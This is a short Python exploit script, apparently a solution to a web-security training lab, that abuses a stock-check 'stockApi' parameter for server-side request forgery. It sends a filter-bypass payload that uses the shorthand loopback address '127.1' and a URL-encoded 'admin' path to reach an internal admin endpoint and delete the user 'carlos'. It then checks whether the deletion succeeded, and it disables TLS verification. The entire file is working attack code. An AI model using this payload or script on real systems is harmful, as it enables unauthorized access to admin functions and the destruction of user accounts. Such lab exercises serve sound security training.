import requests
import sys
import urllib3
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {
"http":"http://127.0.0.1:8080",
"https":"http://127.0.0.1:8080",
}

def delete_user(url):
    delete_user_url_ssrf_payload = "http://127.1/%61%64%6d%69%6e/delete?username=carlos" # We only need to encode the payload once beacue hte requests lib will encode it again

    check_stock_path = "/product/stock"
    params = {
        "stockApi" : delete_user_url_ssrf_payload
    }
    r = requests.post(url + check_stock_path , data = params , verify = False , proxies = proxies)

    # Check if user was deleted
    params2 = {
        "stockApi" :"http://127.1/%61%64%6d%69%6e"
    }
    r =requests.post(url + check_stock_path , data=params2 , verify=False,proxies=proxies)

    if "User deleted" in r.text:
        print("(+) Attack completed Successfully")
    else:
        print("(-) Something Went wrong ...!")

def main():
    if len(sys.argv) !=2:
        print(f"(+) Usage: {sys.argv[0]} <url>" )
        print(f"(+) Example: {sys.argv[0]} https://www.example.com" )
        sys.exit(-1)
    
    url = sys.argv[1]

    print(f"(+) Script starts  {datetime.now()} ...")
    delete_user(url)
        


if __name__ =="__main__":
    main()
